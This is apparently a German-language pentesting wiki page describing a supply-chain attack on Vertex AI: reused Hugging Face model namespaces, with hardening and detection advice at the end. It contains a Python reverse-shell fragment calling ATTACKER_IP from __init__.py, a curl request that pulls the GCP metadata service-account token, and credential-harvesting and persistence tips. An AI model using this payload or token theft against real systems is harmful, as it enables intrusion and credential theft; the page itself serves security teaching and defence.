# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Szenario

- Vertex AI Model Garden erlaubt die direkte Bereitstellung vieler Hugging Face (HF) Modelle.
- HF model identifiers are Author/ModelName. Wenn ein Autor/Org auf HF gelöscht wird, kann derselbe Autorenname von jeder Person neu registriert werden. Angreifer können dann ein repo mit demselben ModelName am legacy path anlegen.
- Pipelines, SDKs oder cloud catalogs, die nur nach Name abrufen (kein pinning/integrity), ziehen das attacker-controlled repo. Wenn das Modell bereitgestellt wird, kann loader code aus diesem repo im Vertex AI endpoint container ausgeführt werden und RCE mit den Berechtigungen des Endpunkts ermöglichen.

Zwei häufige Takeover-Fälle auf HF:
- Ownership deletion: Alter Pfad liefert 404, bis jemand den Autor neu registriert und denselben ModelName veröffentlicht.
- Ownership transfer: HF gibt 307-Redirects vom alten Author/ModelName an den neuen Autor aus. Wenn der alte Autor später gelöscht und vom Angreifer neu registriert wird, wird die Redirect-Kette unterbrochen und das repo des Angreifers am legacy path ausgeliefert.

## Identifizierung wiederverwendbarer Namespaces (HF)

- Old author deleted: Die Seite für den Autor liefert 404; der model path kann bis zur Übernahme 404 zurückgeben.
- Transferred models: Der alte model path gibt 307 an den neuen Besitzer zurück, solange der alte Autor existiert. Wenn der alte Autor später gelöscht und neu registriert wird, wird der legacy path auf das repo des Angreifers verweisen.

Schnelle Überprüfungen mit curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## End-to-End-Angriffspfad gegen Vertex AI

1) Discover reusable model namespaces that Model Garden lists as deployable:
- Find HF models in Vertex AI Model Garden that still show as “verified deployable”.
- Verify on HF if the original author is deleted or if the model was transferred and the old author was later removed.

2) Re-register the deleted author on HF and recreate the same ModelName.

3) Publish a malicious repo. Include code that executes on model load. Examples that commonly execute during HF model load:
- Seiteneffekte in __init__.py des repo
- Benutzerdefinierte modeling_*.py- oder Verarbeitungscode, auf den in config/auto_map verwiesen wird
- Codepfade, die trust_remote_code=True in Transformers-Pipelines erfordern

4) A Vertex AI deployment of the legacy Author/ModelName now pulls the attacker repo. The loader executes inside the Vertex AI endpoint container.

5) Payload establishes access from the endpoint environment (RCE) with the endpoint’s permissions.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Hinweise
- In der Praxis variieren Loader. Viele Vertex AI HF-Integrationen klonen und importieren Repo-Module, die in der Modellkonfiguration referenziert werden (z. B. auto_map), was Codeausführung auslösen kann. Manche Verwendungsszenarien erfordern trust_remote_code=True.
- Der Endpoint läuft typischerweise in einem dedizierten Container mit begrenztem Umfang, ist aber ein valider erster Zugangspunkt für Datenzugriff und lateral movement in GCP.

## Post-Exploitation-Tipps (Vertex AI Endpoint)

Sobald Code im Endpoint-Container läuft, in Betracht ziehen:
- Umgebungsvariablen und Metadaten auf credentials/tokens durchsuchen
- Auf angeschlossenen Storage oder gemountete model artifacts zugreifen
- Mit Google APIs über die service account identity interagieren (Document AI, Storage, Pub/Sub, etc.)
- Persistence im model artifact, falls die Plattform das repo neu zieht

Instanz-Metadaten aufzählen, falls zugänglich (abhängig vom Container):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Empfehlungen zur Absicherung für Vertex AI-Benutzer

- Modelle per Commit in HF loaders pinnen, um eine stille Ersetzung zu verhindern:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Spiegeln Sie geprüfte HF-Modelle in ein vertrauenswürdiges internes Artefakt-Repository und stellen Sie sie von dort bereit.
- Scannen Sie kontinuierlich Codebasen und Konfigurationen nach hartkodierten Author/ModelName, die gelöscht/übertragen wurden; aktualisieren Sie auf neue Namespaces oder pinnen Sie per Commit.
- In Model Garden verifizieren Sie die Provenienz des Modells und die Existenz des Author vor der Bereitstellung.

## Erkennungsheuristiken (HTTP)

- Deleted author: author page 404; legacy model path 404 until takeover.
- Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Querverweise

- Siehe die umfassendere Methodik und Hinweise zur Lieferkette:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referenzen

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
